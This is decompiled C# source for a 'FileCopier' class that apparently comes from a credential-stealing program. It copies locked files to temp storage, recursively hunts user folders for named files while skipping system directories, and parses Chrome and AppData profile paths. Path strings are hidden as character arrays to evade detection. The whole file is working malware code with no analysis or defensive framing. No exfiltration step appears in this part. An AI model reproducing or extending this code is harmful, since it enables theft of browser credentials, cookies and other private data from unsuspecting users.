using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

// Token: 0x0200003C RID: 60
public class FileCopier : IDisposable
{
	// Token: 0x060000FE RID: 254
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);

	// Token: 0x060000FF RID: 255 RVA: 0x00009384 File Offset: 0x00007584
	public string CreateShadowCopy(string filePath)
	{
		string result;
		try
		{
			this.tmpFilename = Path.GetTempFileName();
			if (FileCopier.CopyToTemp(filePath, this.tmpFilename))
			{
				this.createdNew = true;
				result = this.tmpFilename;
			}
			else if (FileCopier.CopyToTemp(filePath, this.tmpFilename))
			{
				this.createdNew = true;
				result = this.tmpFilename;
			}
			else
			{
				this.createdNew = false;
				result = filePath;
			}
		}
		catch
		{
			this.createdNew = false;
			result = filePath;
		}
		return result;
	}

	// Token: 0x06000100 RID: 256 RVA: 0x00009400 File Offset: 0x00007600
	private static bool CopyToTemp(string filePath, string temp)
	{
		bool result;
		try
		{
			result = FileCopier.CopyFile(filePath, temp, false);
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000101 RID: 257 RVA: 0x00009430 File Offset: 0x00007630
	public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
	{
		List<string> list = new List<string>();
		list.Add(new string(new char[]
		{
			'\\',
			'W',
			'i',
			'n',
			'd',
			'o',
			'w',
			's',
			'\\'
		}));
		list.Add(new string(new char[]
		{
			'\\',
			'P',
			'r',
			'o',
			'g',
			'r',
			'a',
			'm',
			' ',
			'F',
			'i',
			'l',
			'e',
			's',
			'\\'
		}));
		list.Add(new string(new char[]
		{
			'\\',
			'P',
			'r',
			'o',
			'g',
			'r',
			'a',
			'm',
			' ',
			'F',
			'i',
			'l',
			'e',
			's',
			' ',
			'(',
			'x',
			'8',
			'6',
			')',
			'\\'
		}));
		list.Add(new string(new char[]
		{
			'\\',
			'P',
			'r',
			'o',
			'g',
			'r',
			'a',
			'm',
			' ',
			'D',
			'a',
			't',
			'a',
			'\\'
		}));
		List<string> list2 = new List<string>();
		if (files == null || files.Length == 0 || level > maxLevel)
		{
			return list2;
		}
		try
		{
			foreach (string text in Directory.GetDirectories(baseDirectory))
			{
				bool flag = false;
				foreach (string value in list)
				{
					if (text.Contains(value))
					{
						flag = true;
						break;
					}
				}
				if (!flag)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag2 = false;
						int num = 0;
						while (num < files2.Length && !flag2)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag2)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag2 = true;
									list2.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in FileCopier.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
						{
							if (!list2.Contains(item))
							{
								list2.Add(item);
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list2;
	}

	// Token: 0x06000102 RID: 258 RVA: 0x00009660 File Offset: 0x00007860
	public static string ChromeGetName(string path)
	{
		try
		{
			string[] array = path.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			if (array[array.Length - 2].Contains(new string(new char[]
			{
				'U',
				's',
				'e',
				'r',
				' ',
				'D',
				'a',
				't',
				'a'
			})))
			{
				return array[array.Length - 1];
			}
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x06000103 RID: 259 RVA: 0x000096CC File Offset: 0x000078CC
	public static string ChromeGetRoamingName(string path)
	{
		try
		{
			return path.Split(new string[]
			{
				new string(new char[]
				{
					'A',
					'p',
					'p',
					'D',
					'a',
					't',
					'a',
					'\\',
					'R',
					'o',
					'a',
					'm',
					'i',
					'n',
					'g',
					'\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries)[0];
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x06000104 RID: 260 RVA: 0x00009734 File Offset: 0x00007934
	public static string ChromeGetLocalName(string path)
	{
		try
		{
			string[] array = path.Split(new string[]
			{
				new string(new char[]
				{
					'A',
					'p',
					'p',
					'D',
					'a',
					't',
					'a',
					'\\',
					'L',
					'o',
					'c',
					'a',
					'l',
					'\\'
				})
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[0] + "_[" + array[1] + "]";
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x06000105 RID: 261 RVA: 0x000097B0 File Offset: 0x000079B0
	public void Dispose()
	{
		try
		{
			if (this.createdNew)
			{
				File.Delete(this.tmpFilename);
			}
		}
		catch
		{
		}
	}

	// Token: 0x04000037 RID: 55
	private string tmpFilename;

	// Token: 0x04000038 RID: 56
	private bool createdNew;
}
